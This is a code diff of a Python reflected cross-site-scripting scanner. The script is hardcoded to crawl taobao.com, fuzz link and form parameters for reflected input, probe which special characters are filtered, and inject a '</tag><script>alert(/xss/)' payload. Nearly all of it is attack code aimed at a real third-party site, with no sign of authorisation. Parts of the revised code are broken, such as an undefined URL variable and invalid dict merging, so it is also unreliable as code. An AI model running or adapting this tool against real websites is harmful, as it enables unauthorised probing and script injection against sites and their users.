@@ -14,7 +14,6 @@ import sys
 url = 'https://www.taobao.com/';
 allow_domain = 'taobao.com'
 
-symbols = '<>/\\\'"`();=&#\{\}+-%*:'
 keywords = (
     'embed','src','svg','onload','style','marquee','onstart','object','data',
     'onerror','iframe','video','audio','a','href','onmousemove','onmouseover',
@@ -69,25 +68,23 @@ def payload_parse_synax(raw,info):
    
     OPTION = r'\{(.*?)\}'
 
+
 def get_dynamic_links_url(murl):
     '''
     Read dynamic links from url, only GET
     Final version
     '''
-    url_links = dict()
-    queue = list()
+    url_links = list()
+    ignore = dict()
     visited = dict()
     response = requests.get(murl)
     html = bs(response.text,'html.parser')
-    a = html.find_all(name='a')
+    a = html.find_all(name='a',attrs={'href':True})
     for el in a:
-        if not 'href' in el:
-            break
         parse = urlsplit(el['href'])
         query = parse[3]
         host = murl.split('//',1)[1].split('/',1)[0]
         dirname = os.path.dirname(murl.split('//',1)[1].split('/',1)[1])
-        regex_url = '^/(.*)?'
         if el['href'].startswith('http'):
             url = el['href']
         elif el['href'].startswith('//'):
@@ -96,15 +93,15 @@ def get_dynamic_links_url(murl):
             url = murl.split('//',1)[0] + '//' + host + el['href']
         else:
             if el['href'].startswith('javascript:'):
-                break
-            url = urljoin(murl,el['href'])
+                continue
+        url = urljoin(murl,el['href'])
         rawurl = requests.get(url, allow_redirects=True).url
         url = rawurl.replace('//','/').replace('/','//',1)
         if url.find('?') != -1:
             url = url.split('?')[0]
         host = url.split('//',1)[1].split('/',1)[0]
         if host.find(allow_domain) == -1:
-            break
+            continue
         qlist = dict()
         if query:
             if query.find('&') != -1:
@@ -118,20 +115,30 @@ def get_dynamic_links_url(murl):
                 if not host in visited:
                     visited[host] = list()
                 if k in visited[host]:
-                    break
+                    continue
+                if k in ignore:
+                    if ignore[k] == 3:
+                        print(k,'ignore')
+                        continue
                 rnd = ''.join(random.sample(string.ascii_letters,8))
-                fuzz = qlist
+                fuzz = qlist.copy()
                 fuzz[k] = rnd
                 response = requests.get(url,params=fuzz)
                 if response.text.find(rnd) != -1:
-                    print(url)
                     print(k,'is dynamic')
-                    if not url in url_links:
-                        url_links[url] = dict()
-                    if not 'get' in url_links[url]:
-                        url_links[url]['get'] = list()
-                    if not k in url_links[url]['get']:
-                        url_links[url]['get'].append(k)
+                    fuzz.pop(k)
+                    item = dict()
+                    item['url'] = url
+                    item['method'] = 'get'
+                    item['param'] = k
+                    item['raw'] = fuzz
+                    if not item in url_links:
+                        url_links.append(item)
+                else:
+                    print(k,'not dynamic')
+                    if not k in ignore:
+                        ignore[k] = 1
+                    ignore[k] += 1
                 visited[host].append(k)
     return url_links
 
@@ -148,10 +155,10 @@ def get_dynamic_links_form(murl):
     Read dynmaic links from form, GET and POST
     Final version
     '''
-    form_links = dict()
+    form_links = list()
     response = requests.get(murl)
     html = bs(response.text,'html.parser')
-    form = html.find_all(name='form')
+    form = html.find_all(name='form', attrs={'action':True})
     for f in form:
         parse = urlsplit(f['action'])
         query = parse[3]
@@ -168,23 +175,32 @@ def get_dynamic_links_form(murl):
         url = url.replace('//','/').replace('/','//',1)
         host = url.split('//',1)[1].split('/',1)[0]
         if host.find(allow_domain) == -1:
-            break
+            continue
         tags = f.find_all(name='input')
+        if f.has_attr('method'):
+            method = f['method']
+        else:
+            method = 'get'
         print('action:',url)
-        print('method:',f['method'])
-        if not url in form_links:
-            form_links[url] = dict()
-        if not f['method'] in form_links[url]:
-            form_links[url][f['method']] = list()
+        print('method:',method)
+        item = dict()
+        item['url'] = url
+        item['method'] = method 
+        count = 1
         data = dict(zip([el['name'] for el in tags],[''.join(random.sample(string.ascii_letters,8)) for _ in tags]))
-        if f['method'] == 'get':
+        if method == 'get':
             response = requests.get(url,params=data)
         else:
             response = requests.post(url,data=data)
         for k,v in data.items():
             if response.text.find(v) != -1:
                 print(k,'is dynamic')
-                form_links[url][f['method']].append(k)
+                item['param' + str(count)] = k
+                count += 1
+            else:
+                print(k,'not dynamic')
+        if 'param1' in item:
+            form_links.append(item)
     return form_links
 
 
@@ -207,7 +223,7 @@ def get_output_position(links):
                     response = requests.post(murl,data=data)
             except Exception as e:
                 print(e)
-                break
+                continue
             for k,v in data.items():
                 regex_rnd = r'.*{0}.*'.format(v)
                 regex_tags = r'\<.*\>.*?{0}.*?\<\/.*\>'.format(v)
@@ -240,39 +256,80 @@ def get_xss_filter(links):
     '''
     find filtered keyword
     '''
-    xlink = links
-    for murl,mitem in links.items():
-        for method,item in mitem.items():
-            for pos,params in item.items():
-                xlink[murl][method][pos] = dict()
-                for p in params:
-                    data = dict()
-                    allowed = list()
-                    for pp in params:
-                        if pp != p:
-                            data[pp] = ''.join(random.sample(string.ascii_letters,8))
-                    for s in symbols:
-                        rnd = ''.join(random.sample(string.ascii_letters,8))
-                        data[p] = rnd + s + rnd
-                        try:
-                            if method == 'get':
-                                response = requests.get(murl,params=data)
-                            else:
-                                response = requests.post(murl,data=data)
-                        except Exception as e:
-                            print(e)
-                            break
-                        keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
-                        if keyword:
-                            for k in keyword:
-                                if k == s:
-                                    allowed.append(s)
-                    xlink[murl][method][pos][p] = [a for a in symbols if a not in allowed] 
-                    if len(allowed) == len(symbols):
-                        print(p,'allowed all symbols')
-                    else:
-                        print(p,','.join([a for a in symbols if a not in allowed]),'filtered')
-    return xlink
+    symbols = '<>`\\\'\"'
+    xlinks = list()
+    for item in links:
+        url = item['url']
+        method = item['method']
+        keys = list(item.keys())
+        params = list()
+        israw = False
+        if 'raw' in item:
+            raw = item['raw']
+            israw = True
+        for k in keys:
+            if k.startswith('param'):
+                params.append(item[k])
+        for p in params:
+            fuzz = dict()
+            allowed = list()
+            for pp in params:
+                if pp != p:
+                    fuzz[pp] = ''.join(random.sample(string.ascii_letters,8))
+            for s in symbols:
+                rnd = ''.join(random.sample(string.ascii_letters,8))
+                fuzz[p] = rnd + s + rnd
+                if israw:
+                    merge = dict(fuzz.items() + raw.items())
+                if method == 'get':
+                    response = requests.get(murl,params=merge)
+                else:
+                    response = requests.get(murl,params=merge)
+                keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
+                if keyword:
+                    for w in keyword:
+                        if w == s:
+                            allowed.append(s)
+            if len(allowed) == len(symbols):
+                item['filtered'] = 'null'
+                print(p,'allowed all symbols')
+            else:
+                filtered = ','.join(a for a in symbols if a not in allowed)
+                item['filtered'] = filtered
+                print(p,filtered,'filtered')
+        xlinks.append(item)
+    # for murl,mitem in links.items():
+    #     for method,item in mitem.items():
+    #         for pos,params in item.items():
+    #             xlink[murl][method][pos] = dict()
+    #             for p in params:
+    #                 data = dict()
+    #                 allowed = list()
+    #                 for pp in params:
+    #                     if pp != p:
+    #                         data[pp] = ''.join(random.sample(string.ascii_letters,8))
+    #                 for s in symbols:
+    #                     rnd = ''.join(random.sample(string.ascii_letters,8))
+    #                     data[p] = rnd + s + rnd
+    #                     try:
+    #                         if method == 'get':
+    #                             response = requests.get(murl,params=data)
+    #                         else:
+    #                             response = requests.post(murl,data=data)
+    #                     except Exception as e:
+    #                         print(e)
+    #                         continue
+    #                     keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
+    #                     if keyword:
+    #                         for k in keyword:
+    #                             if k == s:
+    #                                 allowed.append(s)
+    #                 xlink[murl][method][pos][p] = [a for a in symbols if a not in allowed] 
+    #                 if len(allowed) == len(symbols):
+    #                     print(p,'allowed all symbols')
+    #                 else:
+    #                     print(p,','.join([a for a in symbols if a not in allowed]),'filtered')
+    # return xlink
 
 
 def encode_xss_payload(payload,entype):
@@ -325,7 +382,7 @@ def inject_xss_payload(links):
                     regex_tagname = r'(?<=\<)(.*)?(?=\>{0})'.format(v)
                     tagname = re.findall(regex_tagname,response.text)
                     for tag in tagname:
-                        fuzz = data
+                        fuzz = data.copy()
                         payload = '</{0}><script>alert(/xss/)'.format(tag)
                         fuzz[k] = payload
                         if method == 'get':
@@ -338,7 +395,7 @@ def inject_xss_payload(links):
 
 ulinks = get_dynamic_links_url(url)
 flinks = get_dynamic_links_form(url)
-plinks1 = get_output_position(ulinks)
-plinks2 = get_output_position(flinks)
-xlinks1 = get_xss_filter(plinks1)
-xlinks2 = get_xss_filter(plinks2)
+# plinks1 = get_output_position(ulinks)
+# plinks2 = get_output_position(flinks)
+# xlinks1 = get_xss_filter(plinks1)
+# xlinks2 = get_xss_filter(plinks2)
